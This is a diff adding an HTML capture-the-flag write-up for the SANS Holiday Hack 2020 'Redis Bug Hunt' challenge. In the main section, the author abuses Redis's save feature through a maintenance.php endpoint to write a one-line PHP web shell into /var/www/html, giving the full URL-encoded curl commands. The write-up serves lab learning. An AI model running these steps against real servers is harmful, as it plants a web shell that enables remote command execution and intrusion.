@@ -1,0 +1,108 @@
+<html>
+<head>
+    <link rel="stylesheet" href="./css/style.css">
+    <title>Redis Bug Hunt: SANS Holiday Hack 2020</title>
+    <script type="text/javascript" src="./scripts/chars.js"></script>
+</head>
+<body>
+<div class="content-surround main-centered">
+    <div class="content-background">
+        <div id="mainContent" class="content-body">
+            <div class="content">
+                <!--
+                Common - v2020.DEC.23
+                -->
+
+
+
+                <div class="title">Redis Bug Hunt: SHHC20</div>
+                <div class="writeup">
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('img_kitchen')">
+                                <div class="polaroid-caption">Redis Bug Hunt</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="img_kitchen" class="polaroid-img" style="background-image: url('./screenshots/redis_bug_hunt.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>In the <a href="./kitchen.html" class="link">Kitchen</a> beside <span class="char" onclick="OpenCharModal('holly_evergreen')">Holly Evergreen</span> is a terminal titled Redis Bug Hunt.</p>
+                    <p>In talking with Holly, she mentions doing remote code execution against the host.</p>
+                </div>
+                <div class="writeup">
+                    <div class="polaroid-rotate">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('redis_bug_hunt_1')">
+                                <div class="polaroid-caption">Redis Bug Hunt</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="redis_bug_hunt_1" class="polaroid-img" style="background-image: url('./screenshots/redis_bug_hunt_1.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>Googling around for various ways to abuse Redis, the main thing I found was to use the "save database" functionality to write a new file to the file system.</p>
+                    <p>The db save is in redis format, so it has some binary characters at the beginning and end.  Best bet will be to encode some crlf before/after whatever I want and look for a forgiving interpetation of the file.</p>
+                    <p>The system doens't have ssh client installed, so I can't drop an ssh key to login as root.  </p>
+                    <p>When I drop a file into /etc/sudoers.d, sudoers complains about format do to the binary at the top</p>
+                    <p>I try dropping cron jobs into various locations without much luck.  Doesn't look like cron is running.  (Likely standard in container?)</p>
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('redis_bug_hunt_2')">
+                                <div class="polaroid-caption">Redis Bug Hunt</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="redis_bug_hunt_2" class="polaroid-img" style="background-image: url('./screenshots/redis_bug_hunt_2.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>Well...  For this challenge, I don't need to get root (though it would be neat).  I just need to look at the index page.  So let's try dumping a php file.</p>
+                    <p>URL encode the following string: <span class="command">"\n\n\n&lt;?php system($_GET['cmd']); ?&gt;\n\n"</span></p>
+                    <p>After a couple of tries to get syntax just right, I dropped a new php file that would take an arg and execute raw command.  I then used this to cat the index file.</p>
+                    <p>Clear the existing redis values with command  <span class="command">curl http://localhost/maintenance.php?cmd=flushall</span></p>
+                    <p>Set the encoded value with <span class="command">curl http://localhost/maintenance.php?cmd=set,command,%22%0D%0A%0D%0A%0D%0A%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%0D%0A%0D%0A%22%0D%0A</span></p>
+                    <p>Save to the apache working directory with <span class="command">curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/</span>, then <span class="command">curl http://localhost/maintenance.php?cmd=config,set,dbfilename,jeremy.php</span>, and finally <span class="command">curl http://localhost/maintenance.php?cmd=save</span></p>
+                    <p>Send a command to the new page <span class="command">curl --output - http://localhost/jeremy.php?cmd=cat+index.php</span></p>
+
+                </div>
+
+
+                <div class="writeup">
+                    <p>An overview of all people, places, and events can be learned in the <a href="./index.html" class="link">Introduction</a>.</p>
+                </div>
+
+
+
+                <!--
+                Common - v2020.DEC.23
+                -->
+            </div>
+            <div class="footer" style="">
+                <span class="footer-text">
+                    <a href="./index.html">Find Other Scrolls</a> | <a href="mailto:jeremy@uranusbytes.com">jeremy@uranusbytes.com</a> | <a href="./credits.html">Credits</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="ImgModalDiv" class="modal2">
+    <span id="ImgModalClose" class="modal-close" onclick="CloseImgModal();">&times;</span>
+    <div class="polaroid-big-rotate">
+        <div class="polaroid-big-surround">
+            <img id="ModalImg" src="./images/blank.png" class="polaroid-big" />
+        </div>
+    </div>
+</div>
+
+
+<div id="CharModalDiv" class="modal">
+    <span id="CharModalClose" class="modal-close" onclick="CloseCharModal();">&times;</span>
+    <div class="char-container">
+        <div class="char-child" style="flex-grow: 1; overflow: hidden;">
+            <div id="CharName" class="char-name">Jingle</div>
+            <img id="CharAvatar" class="char-avatar" src="./images/blank.png">
+        </div>
+        <div class="char-child" style="flex-grow: 1;">
+            <div class="char-name">Dialog</div>
+            <div id="CharDialog" class="char-dialog"></div>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
